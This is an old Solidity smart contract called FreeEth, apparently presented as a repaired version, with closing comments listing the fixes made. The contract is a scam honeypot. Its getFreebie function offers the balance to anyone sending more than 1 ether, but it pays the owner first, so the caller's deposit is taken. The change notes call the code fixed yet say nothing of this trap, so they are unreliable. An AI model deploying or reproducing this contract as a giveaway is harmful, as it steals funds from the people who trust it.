pragma solidity ^0.4.19;

contract FreeEth {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
} 

// Changes Made:
// 1. Changed variable name from Owner to owner for consistency with Solidity naming conventions.
// 2. Removed unnecessary condition for the owner address in the withdraw() function.
// 3. Added require statement to check the return value of the external call in the Command() function to prevent unchecked low-level calls vulnerability.